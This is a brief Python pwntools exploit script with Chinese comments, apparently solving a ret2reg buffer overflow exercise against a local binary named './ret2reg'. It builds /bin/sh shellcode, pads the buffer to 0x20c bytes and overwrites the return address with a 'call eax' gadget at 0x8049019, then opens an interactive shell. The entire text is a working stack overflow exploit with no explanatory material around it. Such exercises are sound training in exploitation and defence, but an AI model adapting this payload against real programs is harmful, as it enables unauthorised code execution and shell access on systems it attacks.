#!/usr/bin/python3
from pwn import *

# 生成shellcode
shellcode = asm(shellcraft.sh())

# target为call eax指令
target = 0x8049019

# shellcode
# 虚假信息
# 覆盖返回地址为call eax指令
payload = flat([
    shellcode,
    ((0x208 + 4) - len(shellcode)) * b'A', 
    target
])

sh = process(argv=['./ret2reg', payload])
sh.interactive()
